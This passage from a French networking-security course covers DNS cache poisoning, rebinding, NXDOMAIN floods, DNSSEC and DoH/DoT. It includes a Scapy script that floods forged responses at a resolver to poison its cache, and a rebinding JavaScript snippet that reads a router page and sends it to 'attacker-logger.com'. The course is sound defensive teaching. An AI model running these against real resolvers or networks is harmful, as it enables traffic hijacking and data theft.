| Type: A           |
| Class: IN         |
+-------------------+

Réponse légitime :
+-------------------+
| Transaction ID    | Doit correspondre à la requête
| Flags             | QR=1 (response)
| Questions: 1      |
| Answers: 1        |
+-------------------+
| Answer            |
| Name: example.com |
| Type: A           |
| TTL: 3600         |
| Data: 93.184.216.34
+-------------------+
```

**Validation par le résolveur** :

```c
// Pseudo-code de validation

bool validate_response(dns_response) {
    // Vérifications :
    if (response.transaction_id != query.transaction_id)
        return false;  // ID ne correspond pas

    if (response.src_port != 53)
        return false;  // Pas du port DNS

    if (response.query_name != query.name)
        return false;  // Pas la bonne question

    // Si tout OK : accepter et mettre en cache
    return true;
}
```

**Probabilité de réussite pour l'attaquant** :

```
Ancien système (port source fixe) :
- Transaction ID : 16 bits = 65536 possibilités
- Port source : fixe (53)
→ Probabilité : 1/65536 par tentative

Système moderne (port source aléatoire) :
- Transaction ID : 16 bits = 65536 possibilités
- Port source : ~16 bits = 65536 possibilités
→ Espace total : 2^32 = 4 milliards de combinaisons
→ Probabilité : 1/4 milliards par tentative

Mais Dan Kaminsky a trouvé un moyen d'augmenter drastiquement le taux de tentatives...
```

#### 3.1.3 L'innovation de Kaminsky : multiples chances

**Problème de l'attaque classique** :

```
Attaque naive :
1. Attaquant demande : example.com ?
2. Résolveur interroge le serveur autoritatif
3. Attaquant flood de fausses réponses
4. Si échec : requête mise en cache
5. Attaquant doit attendre l'expiration du TTL (heures)
→ Une seule chance toutes les quelques heures
```

**Innovation de Kaminsky : requêtes uniques** :

```
Attaque Kaminsky :
1. Attaquant demande : random1.example.com ?
2. Résolveur interroge example.com (pas en cache)
3. Attaquant flood de fausses réponses
4. Si échec : random1.example.com mis en cache (peu importe)
5. Attaquant demande : random2.example.com ?
6. Nouvelle fenêtre d'attaque !
7. Répéter indéfiniment

→ Des centaines de tentatives par seconde
→ Réussite en quelques minutes ou heures
```

**Détails de l'empoisonnement** :

```
Fausse réponse DNS de l'attaquant :

Header :
  Transaction ID : 0x1234 (essai aléatoire)

Question :
  Name : random123.example.com
  Type : A

Answer :
  random123.example.com A 1.2.3.4 (peu importe)

Additional section (LA CLÉ !) :
  www.example.com A 6.6.6.6 ← Empoisonnement !
  example.com NS ns1.attacker.com

Si le résolveur accepte cette réponse :
→ Cache empoisonné pour www.example.com
→ Tous les clients redirigés vers 6.6.6.6
→ Peut durer plusieurs heures (TTL)
```

#### 3.1.4 Implémentation conceptuelle

```python
import random
import socket
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send

target_resolver = "8.8.8.8"
target_domain = "example.com"
fake_ip = "6.6.6.6"

attempt = 0
while True:
    attempt += 1

    # Générer un nom aléatoire
    random_subdomain = f"random{random.randint(1, 1000000)}.{target_domain}"

    # 1. Déclencher une requête légitime (via DNS normal)
    #    pour forcer le résolveur à interroger le serveur autoritatif
    try:
        socket.gethostbyname(random_subdomain)
    except:
        pass  # Erreur normale (domaine n'existe pas)

    # 2. Flood de fausses réponses
    for txid in range(1000):  # Essayer 1000 Transaction IDs
        for port in range(1024, 2024):  # Essayer 1000 ports sources
            # Créer une fausse réponse DNS
            fake_response = IP(dst=target_resolver) / \
                           UDP(sport=53, dport=port) / \
                           DNS(
                               id=txid,
                               qr=1,  # Response
                               aa=1,  # Authoritative
                               qd=DNSQR(qname=random_subdomain),
                               an=DNSRR(rrname=random_subdomain, rdata="1.2.3.4"),
                               ns=DNSRR(rrname=target_domain, type="NS",
                                       rdata="ns1.attacker.com"),
                               ar=DNSRR(rrname=f"www.{target_domain}",
                                       rdata=fake_ip)  # POISON !
                           )
            send(fake_response, verbose=False)

    print(f"Tentative {attempt} - {random_subdomain}")

    # Vérifier si l'empoisonnement a réussi
    try:
        result = socket.gethostbyname(f"www.{target_domain}")
        if result == fake_ip:
            print(f"SUCCÈS ! Cache empoisonné après {attempt} tentatives")
            break
    except:
        pass
```

### 3.2 Autres variantes d'attaques DNS

#### 3.2.1 DNS Rebinding

**Objectif** : Contourner la Same-Origin Policy des navigateurs.

```
Scénario :

1. Attaquant contrôle evil.com et son serveur DNS

2. Victime visite evil.com
   - DNS répond : evil.com → 6.6.6.6 (serveur attaquant)
   - TTL très court : 1 seconde

3. JavaScript chargé depuis evil.com

4. Après 1 seconde, attaquant change la réponse DNS :
   - evil.com → 192.168.1.1 (router de la victime)

5. JavaScript fait des requêtes à evil.com
   - Le navigateur pense aller vers evil.com (same-origin)
   - Mais les requêtes vont à 192.168.1.1
   - Contournement du same-origin policy

6. Résultat :
   - Accès à l'interface d'admin du routeur
   - Exfiltration de données du réseau local
   - Attaques sur dispositifs IoT locaux
```

**Code JavaScript** :

```javascript
// Sur evil.com (IP initialement 6.6.6.6)

setTimeout(function() {
    // Après 1 seconde, DNS a changé vers 192.168.1.1

    fetch('http://evil.com/admin')  // Va vers le routeur !
        .then(r => r.text())
        .then(data => {
            // Envoyer les données au vrai serveur de l'attaquant
            navigator.sendBeacon('https://attacker-logger.com', data);
        });
}, 1500);
```

**Protection** :

```
- DNS Pinning dans les navigateurs (TTL minimum forcé)
- Validation des Host headers
- Authentification forte sur les interfaces locales
```

#### 3.2.2 NXDOMAIN Attack

**Objectif** : Saturer le résolveur avec des requêtes de domaines inexistants.

```
Attaque :

1. Botnet envoie des millions de requêtes :
   random1.example.com
   random2.example.com
   random3.example.com
   ... (tous inexistants)

2. Résolveur doit :
   - Interroger les serveurs autoritatifs
   - Recevoir NXDOMAIN (domaine n'existe pas)
   - Générer des requêtes récursives

3. Surcharge :
   - CPU du résolveur
   - Bande passante vers les serveurs autoritatifs
   - Mémoire (cache de résultats négatifs)

4. Résultat :
   - Résolveur ralenti ou inopérant
   - Indisponibilité DNS pour les clients
```

**Impact réel - Attaque Dyn 2016** :

```
Date : 21 octobre 2016
Cible : Dyn (fournisseur de DNS majeur)
Vecteur : Botnet Mirai (IoT)
Volume : 1.2 Tbps, 50-100 millions de requêtes/s

Services affectés :
- Twitter, Netflix, Reddit, GitHub
- PayPal, Spotify, PlayStation Network
- The New York Times, CNN

Durée : Plusieurs vagues sur ~11 heures

Technique :
- NXDOMAIN flood
- Requêtes aléatoires empêchant le cache
- Distribution depuis des milliers de caméras IP compromises
```

#### 3.2.3 Phantom Domain Attack

**Variante sophistiquée** :

```
1. Attaquant créé des domaines "phantom" :
   phantom1.com
   phantom2.com
   ...

2. Configure des serveurs DNS pour ces domaines qui :
   - Répondent très lentement (timeout proche)
   - Ou ne répondent jamais

3. Botnet envoie des requêtes vers ces domaines

4. Résolveur :
   - Interroge les serveurs phantom
   - Attend la réponse (timeout)
   - Retente plusieurs fois
   - Consomme des ressources pendant longtemps

5. Effet :
   - Ressources du résolveur bloquées
   - Accumulation de requêtes en attente
   - Saturation plus efficace qu'avec NXDOMAIN simple
```

### 3.3 DNSSEC : la solution cryptographique

#### 3.3.1 Principe de DNSSEC

**DNSSEC ajoute des signatures cryptographiques à DNS** :

```
DNS classique :
Query : example.com A ?
Response : example.com A 93.184.216.34
→ Aucune vérification d'authenticité possible

DNSSEC :
Query : example.com A ?
Response :
  example.com A 93.184.216.34
  RRSIG (signature cryptographique de la réponse)
  DNSKEY (clé publique pour vérifier la signature)

Client/Résolveur vérifie :
  signature_valide = verify(data, signature, public_key)
  if (!signature_valide) → REJETER
```

#### 3.3.2 Chaîne de confiance

```
Structure hiérarchique :

Root (.)
  ↓ signé par
  ↓ KSK (Key Signing Key)
  ↓
TLD (.com)
  ↓ DS (Delegation Signer) record
  ↓ signé par clé .com
  ↓
example.com
  ↓ DS record
  ↓ signé par clé example.com
  ↓
www.example.com
  ↓ RRSIG
  ↓ signé par ZSK (Zone Signing Key)

Validation :
1. Trust anchor : Clé racine (distribuée avec le résolveur)
2. Vérifier .com avec clé racine
3. Vérifier example.com avec clé .com
4. Vérifier www.example.com avec clé example.com
→ Chaîne de confiance complète
```

#### 3.3.3 Types d'enregistrements DNSSEC

```
RRSIG (Resource Record Signature) :
  Signature cryptographique d'un ensemble d'enregistrements

DNSKEY :
  Clé publique utilisée pour signer la zone
  Deux types :
  - ZSK (Zone Signing Key) : signe les enregistrements
  - KSK (Key Signing Key) : signe les DNSKEY

DS (Delegation Signer) :
  Hash de la DNSKEY du niveau inférieur
  Stocké au niveau parent
  Crée le lien dans la chaîne de confiance

NSEC / NSEC3 :
  Prouve qu'un domaine n'existe pas (NXDOMAIN authentifié)
```

#### 3.3.4 Exemple de requête DNSSEC

```bash
# Requête DNS normale
dig example.com A

# Requête DNSSEC avec validation
dig example.com A +dnssec

# Résultat :
;; ANSWER SECTION:
example.com.    86400   IN  A   93.184.216.34
example.com.    86400   IN  RRSIG A 13 2 86400 (
                20241215000000 20241208000000 12345 example.com.
                kXKP... [signature base64]... )

# Vérification de la chaîne de confiance
dig example.com A +dnssec +trace

# Affiche chaque étape :
# . → .com → example.com → www.example.com
# Avec validation à chaque niveau
```

#### 3.3.5 Limites et défis de DNSSEC

**Limitations** :

```
1. Complexité opérationnelle :
   - Gestion des clés (rotation, sécurité)
   - Processus de signature
   - Coordination parent-enfant pour les DS records

2. Performance :
   - Réponses DNS plus volumineuses (signatures)
   - Calculs cryptographiques
   - Impact sur les résolveurs

3. Taille des réponses :
   - UDP 512 octets → souvent insuffisant
   - Nécessite EDNS0 (Extended DNS)
   - Fragmentation IP possible

4. Adoption limitée :
   - ~30% des domaines .com
   - ~90% des TLD supportent DNSSEC
   - Mais activation volontaire par domaine

5. Pas de confidentialité :
   - DNSSEC signe, ne chiffre pas
   - Les requêtes restent visibles
   - Pour la confidentialité : DoH/DoT nécessaire
```

**Problème du "flag day"** :

```
Rotation de KSK racine (2017-2018) :
- Première rotation depuis la création
- Risque : résolveurs avec ancienne clé → tout DNSSEC échoue
- Solution : période de transition de 13 mois
- Quelques résolveurs obsolètes ont cessé de fonctionner
```

### 3.4 DNS over HTTPS (DoH) et DNS over TLS (DoT)

#### 3.4.1 DNS over TLS (DoT)

```
DNS classique (port 53 UDP/TCP) :
Client → Requête DNS en clair → Résolveur
       ← Réponse en clair ←

Problèmes :
- Interception possible (ISP, MITM)
- Modification possible (spoofing)
- Pas de confidentialité

DNS over TLS (port 853 TCP) :
Client → Connexion TLS → Résolveur
       → Requête DNS (chiffrée)
       ← Réponse DNS (chiffrée)

Avantages :
- Confidentialité (chiffrement)
- Intégrité (TLS garantit)
- Authentification (certificat du résolveur)
```

**Configuration (Linux avec systemd-resolved)** :

```bash
# /etc/systemd/resolved.conf
[Resolve]
DNS=1.1.1.1#cloudflare-dns.com
DNS=9.9.9.9#dns.quad9.net
DNSOverTLS=yes

# Redémarrage
systemctl restart systemd-resolved

# Vérification
resolvectl status
# Doit afficher : "Current DNS Server: 1.1.1.1#cloudflare-dns.com"
```

#### 3.4.2 DNS over HTTPS (DoH)

```
DoH utilise HTTPS (port 443) :

Client → GET /dns-query?dns=... HTTP/2
       → Headers: accept: application/dns-message
       ← HTTP 200
       ← Content-Type: application/dns-message
       ← Body: réponse DNS (binaire)

Avantages supplémentaires vs DoT :
- Indistinguable du trafic HTTPS normal
- Contourne les blocages de port 853
- Support dans les navigateurs

Inconvénients :
- Plus de latence (overhead HTTP/2)
- Complexité accrue
```

**Configuration Firefox** :

```
about:config

network.trr.mode = 2
# 0 = désactivé
# 1 = DoH si disponible, sinon DNS normal
# 2 = DoH préféré, fallback vers DNS
# 3 = DoH uniquement

network.trr.uri = https://1.1.1.1/dns-query
# ou https://dns.google/dns-query
```

#### 3.4.3 Débat et controverses

```
Arguments POUR :
✅ Confidentialité des requêtes DNS
✅ Protection contre interception/modification
✅ Contournement de la censure

Arguments CONTRE :
❌ Contournement des contrôles parentaux
❌ Contournement des filtres d'entreprise
❌ Centralisation (quelques gros fournisseurs)
❌ Complexifie le debugging réseau

Cas d'usage recommandés :
- Wi-Fi public : OUI (protection)
- Entreprise : À évaluer (politique de sécurité)
- Domicile : Selon les besoins
```

### 3.5 Cas réel : Attaque DNS contre un gouvernement

**Incident : Redirection DNS en Iran (2018)**

```
Contexte :
- Attaquants compromettent des comptes chez des registrars
- Modifient les enregistrements NS des domaines gouvernementaux

Technique :
1. Compromission social engineering du registrar
2. Modification des NS records :
   gov.ir NS ns1.gov.ir → NS ns1.attacker.com

3. Contrôle complet du DNS :
   - Toutes les requêtes vers *.gov.ir vont aux serveurs de l'attaquant
   - Redirection vers sites de phishing
   - Certificats TLS frauduleux obtenus

4. Impact :
   - Accès non autorisé à des systèmes sensibles
   - Vol potentiel de credentials
   - Durée : plusieurs semaines avant détection

Leçons :
- Importance de la sécurité des comptes registrar
- Nécessité de 2FA sur comptes critiques
- DNSSEC aurait empêché (mais non déployé)
- Surveillance des changements DNS critique
```

## Conclusion

Les trois attaques étudiées représentent des **menaces fondamentales** qui persistent malgré des décennies de recherche en sécurité :

### SYN Flood
- **Impact** : Déni de service, indisponibilité complète
- **Évolution** : DDoS distribués multi-Tbps
- **Protection** : SYN cookies, rate limiting, scrubbing centers
- **État** : Toujours d'actualité, mais bien comprise et atténuable

### ARP Poisoning
- **Impact** : Man-in-the-middle local, interception totale
- **Évolution** : Toujours efficace sur réseaux mal sécurisés
- **Protection** : DAI, segmentation, 802.1X
- **État** : Menace sérieuse sur Wi-Fi et LANs non sécurisés

### DNS Cache Poisoning
- **Impact** : Redirection globale, phishing massif
- **Évolution** : Kaminsky → DNSSEC → DoH/DoT
- **Protection** : DNSSEC, randomisation, DoH/DoT
- **État** : Largement atténué, mais adoption DNSSEC incomplète

**Points clés à retenir** :

1. **Défense en profondeur** : Aucune protection unique n'est suffisante
2. **Monitoring essentiel** : Détection rapide = mitigation efficace
3. **Mise à jour continue** : Nouvelles variantes émergent constamment
4. **Formation** : L'humain reste le maillon faible

Dans la prochaine section, nous examinerons TLS/SSL, le protocole qui protège la majorité des communications web modernes contre ces attaques.

⏭️ [TLS/SSL : chiffrement des communications](/06-securite/04-tls-ssl.md)
